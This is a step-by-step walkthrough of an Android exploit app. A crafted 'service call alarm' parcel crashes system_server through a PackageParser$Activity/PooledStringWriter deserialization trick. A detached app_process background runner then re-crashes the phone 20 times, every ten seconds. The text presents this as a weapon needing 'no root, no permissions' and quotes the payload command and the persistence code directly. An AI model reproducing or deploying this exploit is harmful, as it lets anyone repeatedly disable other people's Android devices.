### `MainActivity.java` 

```java
public class MainActivity extends AppCompatActivity {
```
This is just a normal Android screen (activity) with a layout.

```java
@Override
protected void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);
    setContentView(R.layout.activity_main);
}
```
When you open the app, it shows the screen from `activity_main.xml`.  
Usually that file has one big button that says “Crash” or “Do it”.

```java
public void doCrash(View view) throws Exception {
```
This function runs when you press the button.  
`View view` = the button you just tapped.

```java
RebootBackgroundRunner.start(this);
```
First thing: starts the zombie background process (the one that survives crashes).  
`this` = gives it info about your app.

```java
Main.crashSystemServer();
```
Immediately runs the alarm exploit once.  
This kills `system_server` right away → phone freezes or reboots services.

```java
}
```
That’s literally everything this file does.

### Summary – What `MainActivity.java` Actually Does

| Line / Part                          | What happens when you press the button                     |
|--------------------------------------|-------------------------------------------------------------|
| `RebootBackgroundRunner.start(this);`| Starts the background “zombie” process that will keep attacking |
| `Main.crashSystemServer();`          | Sends the magic `service call alarm 1 …` → crashes `system_server` now |
| Nothing else                         | The screen might freeze after this – that’s normal!        |

So in total:
- One tap → starts the unstoppable background attacker  
- One tap → crashes the phone immediately  
- Then the background process takes over and keeps crashing it 20 more times

That’s it. The whole attack starts with this tiny button!


### Super Simple Explanation of the Exploit Inside `Main.java`

This file is the **actual weapon**.  
Everything else (button, background runner) just runs one line from this file.

Here’s exactly what the exploit does, step by step, in plain English:

```java
Main.crashSystemServer();
```
→ This single line kills the most important process on the entire phone.

#### How it kills it (what the code really sends):

The code runs this hidden command:
```
service call alarm 1 i32 -1 i32 0 i64 0 ... i32 1 s16 "android.content.pm.PackageParser$Activity" i32 -1 i32 -1 i32 1 s16 "android.os.PooledStringWriter" i32 0
```

Translated to English, it says:

> “Hey AlarmManager, please set an alarm for me.  
> By the way, here’s a little extra info object…  
> …and that object is actually a `PackageParser$Activity` (total lie).  
> And inside that, there’s one more object: `PooledStringWriter`.  
> Go ahead and create it for me.”

#### What Android does with that lie:

1. Android believes us and starts building a `PackageParser$Activity`.
2. While building it, Android runs some automatic code.
3. That code sees our second lie (`PooledStringWriter`) and says:
   > “Okay, let me create a PooledStringWriter right now.”
4. The `PooledStringWriter` class, as soon as it’s born, does this:
   ```java
   parcel.writeInt(0);   // ← tries to write into the message we just sent
   ```
5. But that message is stored in **read-only memory** (protected by the kernel).
6. Trying to write there = illegal = instant crash.
6. The process that tried to write = `system_server` → dies immediately.

#### Result
- `system_server` crashes with `SIGSEGV` in `libbinder.so`
- Phone freezes, reboots, or gets stuck
- Background runner wakes up and does it again 20 times

#### Summary in one sentence:
We send a fake alarm that tricks Android into running a piece of code that illegally writes to protected memory → the whole system process explodes.

That’s the entire exploit.  
No root. No permissions. Just one perfectly crafted `service call`.  
Works on Android 12 and older. Fixed forever in Android 13+.

### `RebootBackgroundRunner.java` 

```java
public static void start(Context context) throws IOException {
```
When you press the button, this function runs first in your normal app.

```java
Parcel parcel = Parcel.obtain();
context.getApplicationInfo().writeToParcel(parcel, 0);
String appInfoB64 = Base64.encodeToString(parcel.marshall(), Base64.NO_WRAP);
```
It takes info about your app (package name, APK path, etc.) and turns it into a text string (Base64) so we can pass it to the background process.

```java
ProcessBuilder pb = new ProcessBuilder(
    "/system/bin/app_process",   // Android's built-in Java runner
    "/",                         // classpath root
    RebootBackgroundRunner.class.getName(),  // which class to run
    appInfoB64                   // our app info as argument
);
Map<String, String> env = pb.environment();
env.put("CLASSPATH", context.getApplicationInfo().sourceDir);
pb.start();
```
Starts a completely separate process (not your app anymore).  
This new process loads your APK and runs the `main()` method below.

---

```java
public static void main(String[] args) {
```
This runs in the new background process (the "zombie").

```java
Os.setsid();
```
Makes the process fully independent – it won’t die when your main app dies.

```java
// Wait for ActivityManager to come back after crash
while (true) {
    Object am = getService.invoke(null, "activity");
    if (am != null && am != oldAm) break;
    Thread.sleep(2000);
}
```
After `system_server` crashes, it restarts.  
This loop waits until the new `system_server` is ready again.

```java
// Decode the app info we passed earlier
byte[] data = Base64.decode(args[0], Base64.DEFAULT);
Parcel p = Parcel.obtain();
p.unmarshall(data, 0, data.length);
p.setDataPosition(0);
appInfo = ApplicationInfo.CREATOR.createFromParcel(p);
```
Turns the text string back into real app info.

```java
context = buildMinimalContext(app(appInfo);
```
Creates a tiny fake Android context so Java code can still work.

```java
for (int i = 0; i < 20; i++) {
    Thread.sleep(10000);                    // wait 10 seconds
    Log.v(TAG, "Run iteration " + (i + 1));
    performBackgroundTask(context, i + 1);   // ← runs the crash again!
}
```
Loops 20 times: every 10 seconds, it calls `Main.crashSystemServer()` again → new crash → `system_server` dies → restarts → loop continues.

---

```java
private static void performBackgroundTask(Context context, int runNumber) {
    Main.crashSystemServer();   // This is the actual alarm exploit
}
```
Just calls the crash code from `Main.java`.

---

### Summary – What Each Part Does

| Part                        | What it does in simple words                             |
|-----------------------------|-------------------------------------------------------------------|
| `start()`                   | Starts a second, hidden process from your normal app             |
| `main()`                    | Runs in that hidden process (survives crashes)                   |
| `Os.setsid()`               | Makes it fully detached                                          |
| Wait for ActivityManager    | Waits until phone recovers from crash                            |
| Rebuild context             | Makes Android think it’s a real app again                        |
| Loop 20 times               | Every 10 seconds: crash `system_server` again                    |
| `performBackgroundTask()`   | Actually runs the alarm exploit (`service call alarm 1 …`)       |

Result: Even when the phone tries to fix itself, this background process wakes up and crashes it again immediately — 20 times in a row. Phone stays dead.




